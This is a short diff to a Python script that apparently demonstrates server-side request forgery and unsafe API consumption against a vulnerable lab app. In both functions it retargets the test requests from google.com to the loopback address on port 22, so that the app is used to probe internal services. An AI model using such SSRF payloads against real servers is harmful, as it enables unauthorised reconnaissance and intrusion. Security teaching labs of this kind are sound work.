@@ -19,7 +19,7 @@ def demonstrate_ssrf():
     print("\n[2] Demonstrating Server-Side Request Forgery (SSRF):")
     try:
         # Target an external URL (can be controlled by the attacker)
-        target_url = "https://www.google.com/"
+        target_url = "http://127.0.0.1:22"
         payload = {"target_url": target_url}
         response = requests.post(f"{BASE_URL}/ssrf", json=payload)
         print(f"SSRF Response from {target_url}: {response.text}")
@@ -36,7 +36,7 @@ def demonstrate_unsafe_consumption_of_apis():
     print("\n[3] Demonstrating Unsafe Consumption of APIs:")
     try:
         # URL returning data that could be malicious or unexpected
-        external_url = "https://www.google.com/"
+        external_url = "http://127.0.0.1:22"
         payload = {"url": external_url}
         response = requests.post(f"{BASE_URL}/fetch", json=payload)
         print(f"Fetched Data from {external_url}: {response.text}")
